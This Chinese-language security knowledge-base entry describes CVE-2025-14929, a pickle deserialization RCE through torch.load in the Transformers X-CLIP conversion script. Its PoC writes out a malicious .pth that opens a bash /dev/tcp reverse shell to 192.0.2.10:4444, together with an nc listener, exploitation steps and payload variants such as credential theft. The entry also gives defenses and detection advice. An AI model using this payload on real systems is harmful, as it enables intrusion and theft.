---
id: ai-security-supply-chain-transformers-xclip-conversion-torch-load-pickle-rce
title: Transformers ≤4.45.1 模型转换脚本 torch.load 未校验：加载不可信 .pth 触发 pickle 反序列化 RCE（CVE-2025-14929）
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: transformers-xclip-conversion-torch-load-pickle
tags:
- ai-supply-chain
- transformers
- huggingface
- pytorch
- torch-load
- pickle
- deserialization
- rce
- model-conversion
- cve-2025-14929
cve:
- CVE-2025-14929
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: ≤ 4.45.1
verification:
  verified_by: verifier-V166
  verified_at: '2026-11-06T13:52:34+08:00'
  notes: 已对照原文与5张图核对：恶意 .pth 构造（visual.proj/text_projection/logit_scale + __reduce__）、nc 4444 监听、trigger.py torch.load(map_location='cpu') 触发、反弹 shell、图05 convert_xclip_original_pytorch_checkpoint_to_hf.py 第279-284行 drive 分支 cached_download 后 torch.load 与 else 分支 load_state_dict_from_url 均与原文一致；CVE-2025-14929、Transformers ≤4.45.1、Kali+Python3.13+PyTorch2.5.0+cpu+Transformers4.45.1 环境一致。affected_versions 已 set-versions。无 sources/source_url。未在本机复跑。
url: /docs/ai-security/supply-chain/ai-security-supply-chain-transformers-xclip-conversion-torch-load-pickle-rce/
draft: false
kb_aliases:
- CVE-2025-14929
- Transformers 模型转换脚本 RCE
- convert_xclip_original_pytorch_checkpoint_to_hf
- torch.load 未校验 .pth
- 恶意 pth 反弹 Shell
- Transformers 4.45.1
---

## 一句话结论

Transformers ≤4.45.1 的 X-CLIP 模型转换脚本 `convert_xclip_original_pytorch_checkpoint_to_hf.py` 在 `convert_xclip_checkpoint` 中直接对下载/指定的 checkpoint 调用 `torch.load(..., map_location="cpu")`，未做签名或格式校验；攻击者提供一个带 `__reduce__` 的恶意 `.pth`，脚本运行时会执行其中的任意命令（CVE-2025-14929）。

## 原理

- **入口**：转换脚本按 `checkpoint_url` 下载模型：若 URL 含 `drive`，先 `cached_download` 到 `pytorch_model.bin`，再 `torch.load(output, map_location="cpu")["model"]`；否则走 `torch.hub.load_state_dict_from_url(checkpoint_url)["model"]`，底层同样是 `torch.load`。
- **pickle 默认反序列化**：`torch.load` 默认使用 pickle；反序列化到自定义类实例时会调用其 `__reduce__`，返回的 `(callable, args)` 会被执行。因此 `.pth` 文件的内容不限于张量，可以是任意可执行载荷。
- **缺少校验**：脚本没有验证模型文件来源、哈希、签名，也没有限制 pickle opcode 或危险全局名，更没有设置 `weights_only=True`；`map_location="cpu"` 只影响张量落点，不影响反序列化执行。
- **危害边界**：代码以运行转换脚本的用户权限执行；若用户具备出站网络，可直接反弹 Shell；若在 CI/训练集群中运行，可进一步读取凭据、模型与数据集。
- **为什么模型文件能骗过用户**：`.pth` 是 PyTorch 常见权重格式，文件名与正常 checkpoint 无异；恶意对象可以和真实权重张量混在同一字典里，加载后仍能返回可用的 state_dict，隐蔽性较高。

## 触发条件

- Transformers 版本 ≤4.45.1，且使用仓库中的 X-CLIP 转换脚本（或复制了相同 `torch.load` 逻辑的自定义脚本）。
- 攻击者能控制脚本的 `checkpoint_url`/本地 checkpoint 路径，或诱导受害者下载恶意 `.pth` 后运行转换。
- 转换脚本运行环境允许代码执行（Python 进程权限）且需要网络出站（反弹 Shell）或本地命令执行。
- 未使用 `weights_only=True`、未做模型文件扫描或沙箱隔离。

## 利用步骤

1. 构造恶意 checkpoint：定义一个实现 `__reduce__` 的类，返回 `(os.system, (cmd,))`，把该对象与正常的 `visual.proj`、`text_projection`、`logit_scale` 等张量一起 `torch.save` 成 `.pth`。
2. 把恶意 `.pth` 放到攻击者可控的 URL/网盘/本地路径，或替换受害者准备转换的 checkpoint。
3. 在攻击端监听端口（如 `nc -lnvp 4444`）。
4. 诱导受害者运行 `python convert_xclip_original_pytorch_checkpoint_to_hf.py --checkpoint_url <恶意地址>`（或等价的转换调用）。
5. 脚本下载后调用 `torch.load`，反序列化触发 `os.system`，反弹 Shell 连接回攻击端。
6. 在授权测试中用 `id`/`touch` 等无害命令替代反弹 Shell，确认代码执行即可。

## PoC

恶意 `.pth` 生成（仅用于授权测试）：

```python
import os, torch

class MaliciousPayload:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1'"
        return (os.system, (cmd,))

checkpoint = {
    "visual.proj": torch.randn(512, 512),
    "text_projection": torch.randn(512, 512),
    "logit_scale": torch.tensor(100.0),
    "malicious_code": MaliciousPayload(),
}
torch.save(checkpoint, "malicious_xclip.pth")
```

触发（与转换脚本中的逻辑一致）：

```python
import torch
checkpoint = torch.load("malicious_xclip.pth", map_location="cpu")
```

脚本实际路径为 `convert_xclip_original_pytorch_checkpoint_to_hf.py` 的 `convert_xclip_checkpoint`：URL 含 `drive` 时先 `cached_download` 再 `torch.load(output, map_location="cpu")["model"]`；否则用 `torch.hub.load_state_dict_from_url(checkpoint_url)["model"]`。原文在 Kali + Python 3.13 + PyTorch 2.5.0+cpu + Transformers 4.45.1 环境复现，成功反弹 Shell。

## 变体与关联

- 变体：把载荷换成下载二阶段、写入 `~/.ssh/authorized_keys`、窃取环境变量/云凭据，或只做无网络的文件写入验证。
- 变体：同一脚本的 `torch.hub.load_state_dict_from_url` 分支也会 `torch.load`；任何接受外部 checkpoint URL 的转换脚本都可复用该模式。
- 变体：用 `weights_only=True` 可阻断大多数 pickle 执行，但需确认脚本内所有 `torch.load` 调用都已加固；旧版 PyTorch 的 `weights_only` 也可能被绕过。
- 关联：[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（通用恶意 PyTorch 模型 pickle 反弹 Shell）、[[ai-security-supply-chain-llamafactory-value-head-torch-load-pickle-rce]]（LLaMA-Factory torch.load 未设 weights_only）、[[ai-security-supply-chain-vllm-torch-load-weights-only-pickle-rce]]（vLLM 同类 CVE）、[[web-python-deserialization-pickle-codetype-function-hijack]]（pickle 反序列化执行原语）。

## 检测与防御

- 升级 Transformers 到修复版本；在转换脚本的所有 `torch.load` 调用上加 `weights_only=True`，并对 checkpoint 做来源、哈希、签名校验。
- 对不可信模型文件先用 Fickling/ModelScan 等工具扫描 pickle opcode、`__reduce__`、`GLOBAL/STACK_GLOBAL`、`os.system`、`subprocess` 等特征；优先使用 `safetensors`。
- 在沙箱/容器中运行转换脚本，默认禁止出站网络，限制文件系统与凭据；高风险 checkpoint 先在隔离环境验证。
- 检测：转换进程出现异常子进程（`bash`/`sh`/`powershell`）、对外连接、DNS 查询，以及 `.pth` 中出现与权重无关的 Python 对象。
- 响应：隔离恶意 checkpoint，阻断 C2 地址，排查运行转换脚本的用户凭据与训练集群权限，轮换可能泄露的密钥。
